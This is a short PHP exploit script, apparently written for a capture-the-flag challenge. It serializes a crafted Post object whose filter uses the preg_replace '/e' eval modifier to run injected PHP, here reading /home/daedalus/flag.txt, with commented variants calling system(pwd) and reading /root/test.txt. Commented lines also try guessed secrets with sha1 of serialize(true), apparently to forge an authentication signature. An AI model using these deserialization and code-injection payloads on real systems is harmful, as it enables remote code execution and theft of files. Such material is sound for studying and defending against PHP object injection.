<?php  
  require_once("classes.php");

  function strtohex($string){
    $string = str_split($string);
    foreach($string as &$char)
      $char = "\x".dechex(ord($char));
    return implode('',$string);
  }

  // $myfilter = new Filter("/a/e", "b");
  // $myfilter = new Filter("/a/e", "file_get_contents('/root/test.txt')");
  $myfilter = new Filter("/a/e", "file_get_contents('/home/daedalus/flag.txt')");
  // $myfilter = new Filter("/a/e", "system(pwd)");
  $mypost = new Post("title", "a", array($myfilter));
  // var_dump($mypost);
  // $mypost = new Post("title", "a", array());
  $s = serialize($mypost);
  var_dump($s); echo "<br>";
  // echo strtohex($s) . "<br>";
  // $u1 = unserialize($s);
  // var_dump($u1); echo "<br>";

  // echo "<br>";

  // $t = "O:4:\"Post\":3:{s:8:\"\x00*\x00title\";s:5:\"title\";s:7:\"\x00*\x00text\";s:1:\"a\";s:10:\"\x00*\x00filters\";a:0:{}}";
  // var_dump($t); echo "<br>";
  // $u2 = unserialize($t);
  // var_dump($u2); echo "<br>";

  // echo "<br>\x40done";


  // echo $mypost->display_post();
  // $contents = file_get_contents("steve.txt");
  // $post = unserialize($contents);
  // var_dump($post);
  
/*
  echo "Title<br>";
  echo $post->title;
  echo "<br>";

  echo "Text<br>";
  echo $post->text;
  echo "<br>";

  echo "Filters<br>";
  echo $post->filters;
  echo "<br>";

  */

  // echo "AUTH_SECRET + serialize true<br>";
  // echo sha1("AUTH_SECRET" . serialize(true));
  // echo "<br><br>";

  // echo "AAAAAAAA + serialize true<br>";
  // echo sha1("AAAAAAAA" . serialize(true));
  // echo "<br><br>";

  // echo "AAAAAAAA + serialize false<br>";
  // echo sha1("AAAAAAAA" . serialize(false));
  // echo "<br><br>";

  // echo "AAAAAAAA <br>";
  // echo sha1("AAAAAAAA");
  // echo "<br><br>";

  // echo "D43d4lu5 + serialize true<br>";
  // echo sha1("D43d4lu5" . serialize(true));
  // echo "<br><br>";

  // echo "DAEDALUS + serialize true<br>";
  // echo sha1("DAEDALUS" . serialize(true));
  // echo "<br><br>";  

  // echo "serialize true <br>";
  // echo sha1(serialize(true));
  // echo "<br><br>";

  // echo "serialize false <br>";
  // echo sha1(serialize(false));
  // echo "<br><br>";

?> 